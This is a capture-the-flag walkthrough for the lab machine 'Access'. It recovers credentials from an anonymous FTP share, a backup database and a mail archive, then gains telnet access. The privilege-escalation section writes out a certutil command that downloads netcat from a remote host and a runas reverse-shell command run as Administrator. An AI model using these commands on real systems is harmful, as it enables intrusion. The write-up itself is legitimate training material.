# Access

### Reconnaissance

- port 21/tcp FTP Microsoft ftpd
- port 23/tcp Telnet
- port 80/tcp HTTP Microsoft IIS httpd 7.5

Anonymous FTP access is enabled and the file share contains a .mdb backup and a password protected .zip file

Switch to binary mode in FTP to download the files

Using `mdbtools` we can dump the table names 

`mdb-tables backup.mdb`

One of the tables is called auth_user, we can dump the table contents using mdb-export

`mdb-export backup.mdb auth_user > users.txt`

The table contains usernames and passwords, none work for telnet but one of the passwords works for the zip 
file

The zip file contains a .pst file, a Personal Storage Table used to store calendar events, contacts and email 
messages

Convert the pst file with `readpst` and view it with `cat`

`readpst 'Access Control.pst'`

### Exploitation

The .pst file contains an email with credentials for a security account which can be used to log in via telnet

`telnet -l security 10.10.10.98`

### Privilege Escalation

Running `cmdkey /list` shows there are Administrator credentials available

Upload a static netcat binary and use `runas` to execute a reverse shell as the Administrator and get the 
root flag

`certutil -urlcache -f http://10.10.10.10/nc.exe nc.exe`

`runas /noprofile /savecred /user:ACCESS\Administrator "c:\users\security\documents\nc.exe 10.10.10.10 4242 -e cmd.exe"`
